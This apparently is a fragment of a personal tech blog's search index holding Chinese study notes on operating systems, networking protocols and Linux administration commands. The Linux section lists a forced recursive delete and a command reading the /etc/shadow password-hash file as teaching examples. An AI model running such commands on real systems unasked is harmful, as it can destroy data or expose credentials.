https://blog.csdn.net/weixin_43914604/article/details/104464558\n用户程序执行陷入指令，请求操作系统服务\n操作系统内核程序对系统调用进行相应的处理\n处理完成后，操作系统内核程序将cpu使用权还给用户\n系统调用发生在用户态，对系统调用的处理发生在核心态\n第 2 章 进程管理 2.1 进程与线程 2.1.1 进程的定义、特征、组成、组织 https://blog.csdn.net/weixin_43914604/article/details/104758221\n进程是动态的;程序是静态的\n进程不能脱离具体程序而虚设， 程序规定了相应进程所要完成的动作\n进程由程序段、数据段、PCB三部分组成\nPCB简介： PCB中记录了操作系统所需的，用于描述进程的当前情况以及控制进程运行的全部信息。 PCB的作用是使一个在多道程序环境下不能独立运行的程序（含数据），成为一个能独立运行的基本单位，一个能与其他进程并发执行的进程。 或者说，OS是根据PCB来对并发执行的进程进行控制和管理的。 例如，当OS要调度某进程执行时，要从该进程的PCB中查处其现行状态及优先级；在调度到某进程后，要根据其PCB中所保存的处理机状态信息，设置该进程恢复运行的现场，并根据其PCB中的程序和数据的内存始址，找到其程序和数据； 进程在执行过程中，当需要和与之合作的进程实现同步，通信或者访问文件时，也都需要访问PCB； 当进程由于某种原因而暂停执行时，又须将器断点的处理机环境保存在PCB中。 可见，在进程的整个生命期中，系统总是通过PCB对进程进行控制的，即系统是根据进程的PCB而不是任何别的什么而感知到该进程的存在的。 所以说，PCB是进程存在的唯一标志。\n2.1.2 进程的状态（运行、就绪、阻塞、创建、终止）及转换（就绪-\u0026gt;运行、运行-\u0026gt;就绪、运行-\u0026gt;阻塞、阻塞-\u0026gt;就绪） https://blog.csdn.net/weixin_43914604/article/details/104819326\n2.1.3 原语实现对进程的控制 https://blog.csdn.net/weixin_43914604/article/details/104880533\n调度是指决定资源分配给哪个进程的行为，是一种决策行为 切换是指实际分配的行为，是执行行为 一般来说现有资源调度，后有进程切换\n原语控制进程的相同点\n2.1.4 进程之间的通信（共享通信、消息传递、管道通信） https://blog.csdn.net/weixin_43914604/article/details/104882398\n2.1.5 线程概念与多线程模型 https://blog.csdn.net/weixin_43914604/article/details/104885645\n2.2 处理机的调度 2.2.1 处理机调度的概念及层次 2.2.2 进程调度的时机（主动放弃与被动放弃）、切换与过程（广义与狭义）、方式（非剥夺与剥夺） 2.2.3 度算法的评价指标（cpu利用率、系统吞吐量、周转时间、等待时间、响应时间） 2.2.4 作业/进程调度算法（FCFS先来先服务、SJF短作业优先、HRRN高响应比优先） 2.2.5 作业/进程调度算法（时间片轮转调度算法、优先级调度算法、多级反馈队列调度算法）\n2.3 进程的同步与互斥 2.3.1 进程的同步与互斥 2.3.2 实现临界区进程互斥的软件实现方法 2.3.3 实现临界区进程互斥的硬件实现方法 2.3.4 信号量机制（整型信号量、记录型信号量P、V） 2.3.5 信号量机制实现进程的互斥、同步与前驱关系 2.3.6 进程同步与互斥经典问题（生产者-消费者问题、多生产者-多消费者问题、吸烟者问题、读者-写者问题、哲学家进餐问题） 2.3.7 管程和java中实现管程的机制\n2.4 死锁 2.4.1 死锁详解(预防、避免、检测、解除)\n第 3 章 内存管理 3.1 内存管理的概念 3.1.1 什么是内存？进程的基本原理，深入指令理解其过程\nhttps://blog.csdn.net/weixin_43914604/article/details/105662331\n3.1.2 内存管理管些什么？ 3.1.3 覆盖技术与交换技术的思想 3.1.4 内存的分配与回收 3.1.5 动态分区分配的四种算法（首次适应算法、最佳适应算法、最坏适应算法、临近适应算法） 3.1.6 分页存储（页号、页偏移量等） 3.1.7 分页存储管理的基本地址变换结构 3.1.8 快表的地址变换结构 3.1.9 二级页表的原理和地址结构\nhttps://blog.csdn.net/weixin_43914604/article/details/105930570\n3.1.10 基本分段存储管理（段表、地址变换、信息共享） 3.1.11 段页式存储管理（段表、页表、地址转换）\n3.2 虚拟内存管理 ​ 3.2.1 虚拟内存的基本概念（局部性原理、高速缓存、虚拟内存的实现） ​ 3.2.2 请求分页管理方式（请求页表、缺页中断机构、地址变换机构） ​ 3.2.3 页面置换算法（最佳置换算法、先进先出置换算法、最近最久未使用置换算法、普通时钟置换算法、改造型时钟置换算法） ​ 3.2.4 页面分配策略（驻留集、页面分配、置换策略、抖动现象、工作集）\n第 4 章 文件管理 4.1 文件系统 ​ 4.1.1 初识文件管理概念和功能 ​ 4.1.2 文件逻辑结构（顺序文件、索引文件、索引顺序文件、多级索引顺序文件）关于数据库的索引如聚簇索引可以看一下索引文件例题的解析，感觉还是可以收获到东西的 ​ 4.1.3 文件目录结构（单级-两级-多级-无环图）、索引节点FCB瘦身 ​ 4.1.4 文件的物理结构(连续分配、链接分配[隐式-显式]、索引分配[链接方案-多层索引-混合索引]) ​ 4.1.5 文件管理空闲磁盘块的几种算法(空闲表法、空闲链表法、位示图法、成组链接法) ​ 4.1.6 文件的基本操作原理(创建、删除、打开、关闭、读-写) ​ 4.1.7 文件共享（索引节点-硬链接、符号链接-软链接） ​ 4.1.8 文件保护（口令保护、加密保护、访问控制） ​ 4.1.9 文件系统的层次结构\n4.2 磁盘组织与管理 ​ 4.2.1 磁盘的结构（磁盘、磁道、扇区、盘面、柱面、磁头） ​ 4.2.2 磁盘调度算法（FCFS、SSTF、SCAN、LOOK、S-SCAN、C-LOOK） ​ 4.2.3 减少磁盘延迟时间的方法（交替编号、错位命名） ​ 4.2.4 磁盘管理（磁盘初始化、引导块、坏块的管理）\n第 5 章 I/O管理 5.1 I/O管理概述 ​ 5.1.1 什么是I/O设备？有几类I/O设备？ ​ 5.1.2 控制I/O设备的I/O控制器 ​ 5.1.3 控制I/O设备的几种方式？(程序直接控制方式、中断驱动方式、DMA、通道控制) ​ 5.1.4 I/O软件的层次结构（用户层软件-设备独立性软件-设备驱动程序-中断处理程序）\n5.2 I/O核心子系统 ​ 5.2.1 内核的I/O核心子系统及功能 ​ 5.2.2 I/O设备假脱机技术(SPOOLing) ​ 5.2.3 I/O设备的分配与回收（DCT-COCT-CHCT-SDT） ​ 5.2.4 缓冲区管理（单缓冲-双缓冲-循环缓冲-缓冲池）\n","permalink":"https://kevinerr.github.io/posts/tech/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","summary":"https://blog.csdn.net/weixin_43914604/article/details/104415990 第 1 章 计算机系统概述 1.1 操作系统的基本概念 1.1.1 操作系统的概念、功能和目标（系统资源的管理者、提供接口、作为扩充机器、虚拟机） https://blog.csdn.net/weixin_43914604/article/details/104408571 1.1.2 操作系统的特征","title":"操作系统"},{"content":"网络的功能 计算机网络的功能主要体现在资源共享、数据通信和分布式处理三个方面。资源共享是计算机网络用户提供的最主要的功能，资源是指在有限时间内可为用户提供各种服务的软、硬件，资源共享是指网络中的用户能够全部地使用网络中的资源，包括软件共享、硬件共享和数据共享，通常，用户本身不需要考虑自己所使用的资源在网络中的具体位置。\n数据通信主要完成资源子网中各个独立的计算机系统之间的信息数据的传递，分布式处理则是利用网络技术多个独立的计算机系统连接组合成一个高性能的计算机系统，计算机群集，分布式系统，网络等都是这一功能应用的典型实例。\nCOOKIE/SESSION https://www.jianshu.com/p/6623416161ff\n 由于HTTP协议是无状态的协议，所以服务端需要记录用户的状态时，就需要用某种机制来识具体的用户，这个机制就是Session.典型的场景比如购物车，当你点击下单按钮时，由于HTTP协议无状态，所以并不知道是哪个用户操作的，所以服务端要为特定的用户创建了特定的Session，用用于标识这个用户，并且跟踪用户，这样才知道购物车里面有几本书。这个Session是保存在服务端的，有一个唯一标识。在服务端保存Session的方法很多，内存、数据库、文件都有。集群的时候也要考虑Session的转移，在大型的网站，一般会有专门的Session服务器集群，用来保存用户会话，这个时候 Session 信息都是放在内存的，使用一些缓存服务比如Memcached之类的来放 Session。 思考一下服务端如何识别特定的客户？这个时候Cookie就登场了。每次HTTP请求的时候，客户端都会发送相应的Cookie信息到服务端。实际上大多数的应用都是用 Cookie 来实现Session跟踪的，第一次创建Session的时候，服务端会在HTTP协议中告诉客户端，需要在 Cookie 里面记录一个Session ID，以后每次请求把这个会话ID发送到服务器，我就知道你是谁了。有人问，如果客户端的浏览器禁用了 Cookie 怎么办？一般这种情况下，会使用一种叫做URL重写的技术来进行会话跟踪，即每次HTTP交互，URL后面都会被附加上一个诸如 sid=xxxxx 这样的参数，服务端据此来识别用户。 Cookie其实还可以用在一些方便用户的场景下，设想你某次登陆过一个网站，下次登录的时候不想再次输入账号了，怎么办？这个信息可以写到Cookie里面，访问网站的时候，网站页面的脚本可以读取这个信息，就自动帮你把用户名给填了，能够方便一下用户。这也是Cookie名称的由来，给用户的一点甜头。所以，总结一下：Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。  访问网站 1、在浏览器输入url 2、浏览器向DNS解析url的ip地址 3、浏览器与服务器建立tcp连接（默认端口号80；2个套接字确定一条tcp连接） 4、浏览器发出http请求（get index.html) 5、服务器通过http将index.html发送给浏览器 6、tcp连接释放，浏览器解释文件index.html，并将web页显示给用户 HTTP缓存 https://www.jianshu.com/p/227cee9c8d15\nHTTP 超文本传输协议HyperText Transfer Protocol\n基于TCP协议的应用层传输协议\n客户端和服务端\n无状态 (stateless) 协议 Cookie\nConnection: Keep-Alive实现长连接\n正在传输的类型由Content-Type加以标记\n在实际的应用中，客户端往往会发出一系列请求，接着服务器端对每个请求进行响应。对于这些请求|响应，如果每次都经过一个单独的TCP连接发送，称为非持久连接。反之，如果每次都经过相同的TCP连接进行发送，称为持久连接。\n非持久连接在每次请求|响应之后都要断开连接，下次再建立新的TCP连接，这样就造成了大量的通信开销。例如前面提到的往返时间(RTT) 就是在建立TCP连接的过程中的代价。\nHTTP请求 由请求行，消息报头，请求正文三部分构成\n1、请求行由请求Method, URL 字段和HTTP Version三部分构成\n1  GET /example.html HTTP/1.1 (CRLF)   2、消息报头由一系列的键值对组成，允许客户端向服务器端发送一些附加信息或者客户端自身的信息\n3、HTTP请求正文\n只有在发送POST请求时才会有请求正文，GET方法并没有请求正文\nHTTP响应 也由三部分组成，包括状态行，消息报头，响应正文。\n1、状态行也由三部分组成，包括HTTP协议的版本，状态码，以及对状态码的文本描述。例如\n1  HTTP/1.1 200 OK （CRLF）   GET/POST  GET提交的数据放在URL中，POST则不会。这是最显而易见的差别。这点意味着GET更不安全（POST也不安全，因为HTTP是明文传输抓包就能获取数据内容，要想安全还得加密） GET回退浏览器无害，POST会再次提交请求（GET方法回退后浏览器再缓存中拿结果，POST每次都会创建新资源） GET提交的数据大小有限制（是因为浏览器对URL的长度有限制，GET本身没有限制），POST没有 GET可以被保存为书签，POST不可以。这一点也能感受到。 GET能被缓存，POST不能 GET只允许ASCII字符，POST没有限制 GET会保存再浏览器历史记录中，POST不会。这点也能感受到。  HTTPS 内容加密建立一个信息安全通道，来保证数据传输的安全；\n身份认证确认网站的真实性\n数据完整性防止内容被第三方冒充或者篡改\nSSL (Secure Socket Layer，安全套接字层)\nTLS (Transport Layer Security，传输层安全协议)\nTLS\nhttps://zhuanlan.zhihu.com/p/399105434\n协议 https://zhuanlan.zhihu.com/p/93894145\n电子邮件 SMTP（simple mail transfer protocol）推 POP3（post office protocol邮局协议）拉 MIME（multipurpose internet mail extensions多用途网络邮件补充）：非ASCII码数据 IMAP（因特网报文存取协议）：只读报文的某一部分\nNAT (Network Address Translation)网络地址转换\n私有地址（10 172 192）\u0026ndash;公用地址\n该网络中的主机使用私用IP地址.当私有网络内部主机和外部Internet通信时,网关(gateway)路由器负责将私有IP地址转换为全球IP地址\nNAPT (Network Address and Port Translation)\nCIDR Classless Inter-Domain Routing，无类域间路由\n细分网络、子网掩码、CIDR（构成超网，查找路由表最长前缀匹配）\nARP 地址解析协议，即ARP（Address Resolution Protocol）根据IP地址获取物理地址的一个TCP/IP协议\n工作过程\n假设主机A和B在同一个网段，主机A要向主机B发送信息，具体的地址解析过程如下：\n 主机A首先查看自己的ARP缓存表，确定其中是否包含有主机B对应的ARP表项。如果找到了对应的MAC地址，则主机A直接利用ARP表中的MAC地址，对IP数据包进行帧封装，并将数据包发送给主机B。 如果主机A在ARP表中找不到对应的MAC地址，则将缓存该数据报文，然后以广播方式发送一个ARP请求报文。ARP请求报文中的发送端IP地址和发送端MAC地址为主机A的IP地址和MAC地址，目标IP地址和目标MAC地址为主机B的IP地址和全0的MAC地址。由于ARP请求报文以广播方式发送，该网段上的所有主机都可以接收到该请求，但只有被请求的主机（即主机B）会对该请求进行处理。 主机B比较自己的IP地址和ARP请求报文中的目标IP地址，当两者相同时进行如下处理：将ARP请求报文中的发送端（即主机A）的IP地址和MAC地址存入自己的ARP表中。之后以单播方式发送ARP响应报文给主机A，其中包含了自己的MAC地址。 主机A收到ARP响应报文后，将主机B的MAC地址加入到自己的ARP表中以用于后续报文的转发，同时将IP数据包进行封装后发送出去。  当主机A和主机B不在同一网段时，主机A就会先向网关发出ARP请求，ARP请求报文中的目标IP地址为网关的IP地址。当主机A从收到的响应报文中获得网关的MAC地址后，将报文封装并发给网关。如果网关没有主机B的ARP表项，网关会广播ARP请求，目标IP地址为主机B的IP地址，当网关从收到的响应报文中获得主机B的MAC地址后，就可以将报文发给主机B；如果网关已经有主机B的ARP表项，网关直接把报文发给主机B。\nDHCP DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）\n是一个局域网的网络协议，使用UDP协议工作，统一使用两个IANA分配的端口：67（服务器端），68（客户端）。DHCP通常被用于局域网环境，主要作用是集中的管理、分配IP地址，使client动态的获得IP地址、Gateway地址、DNS服务器地址等信息，并能够提升地址的使用率。简单来说，DHCP就是一个不需要账号密码登录的、自动给内网机器分配IP地址等信息的协议。\nICMP ping/traceroute\nICMP是 Internet Control Message Protocol 的缩写，即互联网控制消息协议\n它用于 TCP/IP 网络中发送控制消息，提供可能发生在通信环境中的各种问题反馈，通过这些信息，使网络管理者可以对所发生的问题作出诊断，然后采取适当的措施解决问题。虽然 ICMP 是网络层协议，但是它不像 IP 协议和 ARP 协议一样直接传递给数据链路层，而是先封装成 IP 数据包然后再传递给数据链路层。所以在 IP 数据包中如果协议类型字段的值是 1 的话，就表示 IP 数据是 ICMP 报文。\nICMP协议的类型分为两大类，查询报文和差错报文。\n非对称加密RSA 公钥(E,N) 私钥（D,N）\nCDN Content Delivery Network，内容分发网络\nhttps://zhuanlan.zhihu.com/p/52362950\n诞生 随着互联网的爆炸式发展，网络拥塞越来越严重，将会成为互联网发展的最大障碍。\n原理 CDN这个技术其实说起来并不复杂，最初的核心理念，就是将内容缓存在终端用户附近。\n内容源不是远么？那么，我们就在靠近用户的地方，建一个缓存服务器，把远端的内容，复制一份，放在这里，不就OK了？\nVPN 应用：居家办公、访问校园网、访问**\nISP（Internet Service Provider）：因特网服务提供商\nVPN（Virtual Private Network）：虚拟专用网络\n站点\u0026ndash;站点 VPN 客户端站点VPN、远程登录VPN 不需要长时间进行链接、使用浏览器通信、\n全隧道、半隧道\nVPN的职责 加密（不然你知道、完整（数据被你破坏、认证（电脑被你黑了\nVPN框架 IPsec（网络层、SSL/TLS（表示层\n","permalink":"https://kevinerr.github.io/posts/tech/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/","summary":"网络的功能 计算机网络的功能主要体现在资源共享、数据通信和分布式处理三个方面。资源共享是计算机网络用户提供的最主要的功能，资源是指在有限时间内","title":"网络应用"},{"content":"Linux常用命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  打包并压缩文件:“tar -czvf 压缩包名.tar.gz 文件名” 解压并展开压缩包:“tar -xzvf 压缩包名.tar.gz” unzip 解压后缀名.zip的文件   sync #将数据从内存同步到硬盘 shutdown -h 10 #十分钟后关机 reboot #重启=shutdown -r now halt #关闭系统=shutdown -h now  cd ~ #回到当前用户目录 mkdir -p test2/test3/test4 #递归创建文件夹 rmdir -p test2/test3/test4 #递归删除多个目录  cp #只能复制文件  rm -rf #GG -f强制删除 -r递归删除  mv #移动文件和文件夹或重命名文件夹   */：* 根目录，一般根目录下只存放目录，不要存放文件，/etc、/bin、/dev、/lib、/sbin应该和根目录放置在一个分区中 */bin:/usr/bin:* 可执行二进制文件的目录，如常用的命令ls、tar、mv、cat等。 */boot：* 放置linux系统启动时用到的一些文件。/boot/vmlinuz为linux的内核文件，以及/boot/gurb。建议单独分区，分区大小100M即可 */dev：* 存放linux系统下的设备文件，访问该目录下某个文件，相当于访问某个设备，常用的是挂载光驱mount /dev/cdrom /mnt。 */etc：* 系统配置文件存放的目录，不建议在此目录下存放可执行文件，重要的配置文件有/etc/inittab、/etc/fstab、/etc/init.d、/etc/X11、/etc/sysconfig、/etc/xinetd.d修改配置文件之前记得备份。注：/etc/X11存放与x windows有关的设置。 */home：* 系统默认的用户家目录，新增用户账号时，用户的家目录都存放在此目录下，~表示当前用户的家目录，~test表示用户test的家目录。建议单独分区，并设置较大的磁盘空间，方便用户存放数据 */lib:/usr/lib:/usr/local/lib：* 系统使用的函数库的目录，程序在执行过程中，需要调用一些额外的参数时需要函数库的协助，比较重要的目录为/lib/modules。 */lost+fount：* 系统异常产生错误时，会将一些遗失的片段放置于此目录下，通常这个目录会自动出现在装置目录下。如加载硬盘于/disk 中，此目录下就会自动产生目录/disk/lost+found */mnt:/media：* 光盘默认挂载点，通常光盘挂载于/mnt/cdrom下，也不一定，可以选择任意位置进行挂载。 */opt：* 给主机额外安装软件所摆放的目录。如：FC4使用的Fedora 社群开发软件，如果想要自行安装新的KDE 桌面软件，可以将该软件安装在该目录下。以前的 Linux 系统中，习惯放置在 /usr/local 目录下 */proc：* 此目录的数据都在内存中，如系统核心，外部设备，网络状态，由于数据都存放于内存中，所以不占用磁盘空间，比较重要的目录有/proc/cpuinfo、/proc/interrupts、/proc/dma、/proc/ioports、/proc/net/等 */root：* 系统管理员root的家目录，系统第一个启动的分区为/，所以最好将/root和/放置在一个分区下。 */sbin:/usr/sbin:/usr/local/sbin：* 放置系统管理员使用的可执行命令，如fdisk、shutdown、mount等。与/bin不同的是，这几个目录是给系统管理员root使用的命令，一般用户只能\u0026quot;查看\u0026quot;而不能设置和使用。 */tmp：* 一般用户或正在执行的程序临时存放文件的目录,任何人都可以访问,重要数据不可放置在此目录下 /srv： 服务启动之后需要访问的数据目录，如www服务需要访问的网页数据存放在/srv/www内 **/usr： 应用程序存放目录，*/usr/bin** 存放应用程序**， /usr/share 存放共享数据，*/usr/lib* 存放不能直接运行的，却是许多程序运行所必需的一些函数库文件。/usr/local:存放软件升级包。*/usr/share/doc:* 系统说明文件存放目录。*/usr/share/man:* 程序说明文件存放目录，使用 man ls时会查询/usr/share/man/man1/ls.1.gz的内容建议单独分区，设置较大的磁盘空间 */var：* 放置系统执行过程中经常变化的文件，如随时更改的日志文件 /var/log，/var/log/message： 所有的登录文件存放目录，*/var/spool/mail：* 邮件存放的目录，/var/run: 程序或服务启动\n文件基本属性   当为 d 则是目录\n  当为 - 则是文件；\n  若是 l 则表示为链接文档(link file)；\n  若是 b 则表示为装置文件里面的可供储存的接口设备(可随机存取装置)；\n  若是 c 则表示为装置文件里面的串行端口设备，例如键盘、鼠标(一次性读取装置)。\n1 2 3  chmod #change mode chown #change ownership chgrp #change group     查看文件 1 2 3 4 5 6 7 8 9 10 11 12 13   cd /etc/sysconfig/network-scripts/  cat -n #-n显示行号，用于显示小文件的内容，或者在shell脚本里显示文件内容，不支持翻页。  tac #从最后一行开始  head  tail  more  less #最好用，上下翻页，q键退出 /要查询的字符向下查询 ?向上查询     touch f1#创建文件  ln f1 f2  ln -s f1 f3  echo \u0026#34;i love djx\u0026#34; \u0026gt;\u0026gt;f1 #输入字符串   硬链接：拷贝，只有数目为0时才删除\n软链接：快捷方式\n账号管理 1 2 3 4 5 6 7 8  useradd djx #-G给用户分配组 cat /etc/password #用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell userdel -r djx usermod -d /home/z passwd 选项 用户名 #-l 锁定口令，即禁用账号。 -u 口令解锁。 passwd djx su djx hostname   用户组管理 1 2 3 4 5 6 7 8   groupadd -g 520 djx #指定520端口号，不指定默认自增1  cat /etc/group  groupdel  groupmod -g 666 -n newdjx djx  su djx  newgrp root #切换组   cat /etc/shadow #登录口令 加密的   磁盘管理  列出文件系统的整体磁盘使用量 检查磁盘空间使用量 磁盘分区 磁盘格式化 磁盘检验 磁盘的挂载与删除  1 2 3 4 5 6  df df -h du mkdir /mnt/hdc6 mount /dev/hdc6 /mnt/hdc6 #Mac插入u盘或磁盘需要挂载到mnt目录中才能使用 umount /dev/hdc6   进程管理 基本概念\n linux中，每个程序都有自己的进程，每个进程都有一个id号 每个进程都有一个父进程 进程有前台和后台运行2种方式 一般服务后台运行，程序前台运行  命令\n1 2 3 4  ps -aux kill -9 进程id  nohup 代表后台z   文件：读写执行（查看、创建、删除、移动、复制、编辑），权限（用户、用户组），系统（磁盘、进程）\n下载环境 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  # rpm下载 mkdir java#下载jdk rpm java -version #查看版本 rpm -qa|grep jdk #检测jdk版本信息 rpm -e --nodeps xx #卸载jdk，xx表示检测出来的jdk rpm -ivh rpm包 #安装，-i是安装（install），-v是列出更多详细信息（verbose），-h是在安装时列出hash标记  #tar下载 mkdir java #在/usr下新建文件夹 tar -zxvf jdk-8u171-linux-x64.tar.gz #得到文件夹：jdk1.8.0_171 vim /etc/profile #修改配置环境，添加以下环境,rpm安装不用配，解压缩才用配 \tJAVA_HOME=/usr/java/jdk1.8.0_171  CLASSPATH=$JAVA_HOME/lib/  PATH=$PATH:$JAVA_HOME/bin  export PATH JAVA_HOME CLASSPATH source /etc/profile #重新加载文件 java -version #查看版本  #yum下载 yum list installed |grep java #查看是否自带jdk yum -y remove java-1.8.0-openjdk.x86_64 yum -y remove tzdata-java.noarch #卸载掉自带的 yum -y list java* #查看yum库中的Java安装包 yum -y install java-1.8.0-openjdk*   防火墙 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  常用命令： systemctl start firewalld #启动 systemctl stop firewalld #停止 systemctl status firewalld #查看状态  开放或关闭端口： firewall-cmd --zone=public --add-port=80/tcp --permanent #开放80/tcp端口 （--permanent永久生效，没有此参数重启后失效） firewall-cmd --zone=public --query-port=80/tcp #查看80/tcp端口 firewall-cmd --zone=public --remove-port=80/tcp --permanent #关闭80/tcp端口  批量开放或关闭端口： firewall-cmd --zone=public --add-port=40000-45000/tcp --permanent #批量开放端口，打开从40000到45000之间的所有端口 firewall-cmd --zone=public --list-ports #查看系统所有开放的端口 firewall-cmd --zone=public --remove-port=40000-45000/tcp --permanent #批量关闭端口，关闭从40000到45000之间的所有端口  更新防火墙的设置： firewall-cmd --reload #更新防火墙的设置，使上面的修改生效  阿里云还需配置安全组规则   shell脚本 ACwing 常用文件管理命令 https://www.acwing.com/file_system/file/content/whole/index/content/2855620/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  (1) ctrl c: 取消命令，并且换行 (2) ctrl u: 清空本行命令 (3) tab键：可以补全命令和文件名，如果补全不了快速按两下tab键，可以显示备选选项 (4) ls: 列出当前目录下所有文件，蓝色的是文件夹，白色的是普通文件，绿色的是可执行文件 (5) pwd: 显示当前路径 (6) cd XXX: 进入XXX目录下, cd .. 返回上层目录 (7) cp XXX YYY: 将XXX文件复制成YYY，XXX和YYY可以是一个路径，比如../dir_c/a.txt，表示上层目录下的dir_c文件夹下的文件a.txt (8) mkdir XXX: 创建目录XXX (9) rm XXX: 删除普通文件; rm XXX -r: 删除文件夹 (10) mv XXX YYY: 将XXX文件移动到YYY，和cp命令一样，XXX和YYY可以是一个路径；重命名也是用这个命令 (11) touch XXX: 创建一个文件 (12) cat XXX: 展示文件XXX中的内容 (13) 复制文本  windows/Linux下：Ctrl + insert，Mac下：command + c (14) 粘贴文本  windows/Linux下：Shift + insert，Mac下：command + v   tmux教程 https://www.acwing.com/file_system/file/content/whole/index/content/2855620/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  功能：  (1) 分屏。  (2) 允许断开Terminal连接后，继续运行进程。 结构：  一个tmux可以包含多个session，一个session可以包含多个window，一个window可以包含多个pane。  实例：  tmux:  session 0:  window 0:  pane 0  pane 1  pane 2  ...  window 1  window 2  ...  session 1  session 2  ... 操作：  (1) tmux：新建一个session，其中包含一个window，window中包含一个pane，pane里打开了一个shell对话框。  (2) 按下Ctrl + a后手指松开，然后按%：将当前pane左右平分成两个pane。  (3) 按下Ctrl + a后手指松开，然后按\u0026#34;（注意是双引号\u0026#34;）：将当前pane上下平分成两个pane。  (4) Ctrl + d：关闭当前pane；如果当前window的所有pane均已关闭，则自动关闭window；如果当前session的所有window均已关闭，则自动关闭session。  (5) 鼠标点击可以选pane。  (6) 按下ctrl + a后手指松开，然后按方向键：选择相邻的pane。  (7) 鼠标拖动pane之间的分割线，可以调整分割线的位置。  (8) 按住ctrl + a的同时按方向键，可以调整pane之间分割线的位置。  (9) 按下ctrl + a后手指松开，然后按z：将当前pane全屏/取消全屏。  (10) 按下ctrl + a后手指松开，然后按d：挂起当前session。  (11) tmux a：打开之前挂起的session。  (12) 按下ctrl + a后手指松开，然后按s：选择其它session。  方向键 —— 上：选择上一项 session/window/pane  方向键 —— 下：选择下一项 session/window/pane  方向键 —— 右：展开当前项 session/window  方向键 —— 左：闭合当前项 session/window  (13) 按下Ctrl + a后手指松开，然后按c：在当前session中创建一个新的window。  (14) 按下Ctrl + a后手指松开，然后按w：选择其他window，操作方法与(12)完全相同。  (15) 按下Ctrl + a后手指松开，然后按PageUp：翻阅当前pane内的内容。  (16) 鼠标滚轮：翻阅当前pane内的内容。  (17) 在tmux中选中文本时，需要按住shift键。（仅支持Windows和Linux，不支持Mac，不过该操作并不是必须的，因此影响不大）  (18) tmux中复制/粘贴文本的通用方式：  (1) 按下Ctrl + a后松开手指，然后按[  (2) 用鼠标选中文本，被选中的文本会被自动复制到tmux的剪贴板  (3) 按下Ctrl + a后松开手指，然后按]，会将剪贴板中的内容粘贴到光标处   vim教程 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  功能：  (1) 命令行模式下的文本编辑器。  (2) 根据文件扩展名自动判别编程语言。支持代码缩进、代码高亮等功能。  (3) 使用方式：vim filename  如果已有该文件，则打开它。  如果没有该文件，则打开个一个新的文件，并命名为filename 模式：  (1) 一般命令模式  默认模式。命令输入方式：类似于打游戏放技能，按不同字符，即可进行不同操作。可以复制、粘贴、删除文本等。  (2) 编辑模式  在一般命令模式里按下i，会进入编辑模式。  按下ESC会退出编辑模式，返回到一般命令模式。  (3) 命令行模式  在一般命令模式里按下:/?三个字母中的任意一个，会进入命令行模式。命令行在最下面。  可以查找、替换、保存、退出、配置编辑器等。 操作：  (1) i：进入编辑模式  (2) ESC：进入一般命令模式  (3) h 或 左箭头键：光标向左移动一个字符  (4) j 或 向下箭头：光标向下移动一个字符  (5) k 或 向上箭头：光标向上移动一个字符  (6) l 或 向右箭头：光标向右移动一个字符  (7) n\u0026lt;Space\u0026gt;：n表示数字，按下数字后再按空格，光标会向右移动这一行的n个字符  (8) 0 或 功能键[Home]：光标移动到本行开头  (9) $ 或 功能键[End]：光标移动到本行末尾  (10) G：光标移动到最后一行  (11) :n 或 nG：n为数字，光标移动到第n行  (12) gg：光标移动到第一行，相当于1G  (13) n\u0026lt;Enter\u0026gt;：n为数字，光标向下移动n行  (14) /word：向光标之下寻找第一个值为word的字符串。  (15) ?word：向光标之上寻找第一个值为word的字符串。  (16) n：重复前一个查找操作  (17) N：反向重复前一个查找操作  (18) :n1,n2s/word1/word2/g：n1与n2为数字，在第n1行与n2行之间寻找word1这个字符串，并将该字符串替换为word2  (19) :1,$s/word1/word2/g：将全文的word1替换为word2  (20) :1,$s/word1/word2/gc：将全文的word1替换为word2，且在替换前要求用户确认。  (21) v：选中文本  (22) d：删除选中的文本  (23) dd: 删除当前行  (24) y：复制选中的文本  (25) yy: 复制当前行  (26) p: 将复制的数据在光标的下一行/下一个位置粘贴  (27) u：撤销  (28) Ctrl + r：取消撤销  (29) 大于号 \u0026gt;：将选中的文本整体向右缩进一次  (30) 小于号 \u0026lt;：将选中的文本整体向左缩进一次  (31) :w 保存  (32) :w! 强制保存  (33) :q 退出  (34) :q! 强制退出  (35) :wq 保存并退出  (36) :set paste 设置成粘贴模式，取消代码自动缩进  (37) :set nopaste 取消粘贴模式，开启代码自动缩进  (38) :set nu 显示行号  (39) :set nonu 隐藏行号  (40) gg=G：将全文代码格式化  (41) :noh 关闭查找关键词高亮  (42) Ctrl + q：当vim卡死时，可以取消当前正在执行的命令 异常处理：  每次用vim编辑文件时，会自动创建一个.filename.swp的临时文件。  如果打开某个文件时，该文件的swp文件已存在，则会报错。此时解决办法有两种：  (1) 找到正在打开该文件的程序，并退出  (2) 直接删掉该swp文件即可   shell脚本 https://www.acwing.com/file_system/file/content/whole/index/content/2855883/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  概论 注释 变量 默认变量 数组 expr命令 read命令 echo命令 printf命令 test命令与判断符号[] 判断语句 循环语句 函数 exit命令 文件重定向 引入外部脚本   ssh登录 https://www.acwing.com/file_system/file/content/whole/index/content/2898263/\nscp传文件 https://www.acwing.com/file_system/file/content/whole/index/content/2898266/\ngit https://www.acwing.com/file_system/file/content/whole/index/content/2932078/\nhttps://git.acwing.com/\n管道 https://www.acwing.com/file_system/file/content/whole/index/content/3030404/\n环境变量 https://www.acwing.com/file_system/file/content/whole/index/content/3030412/\n常用命令 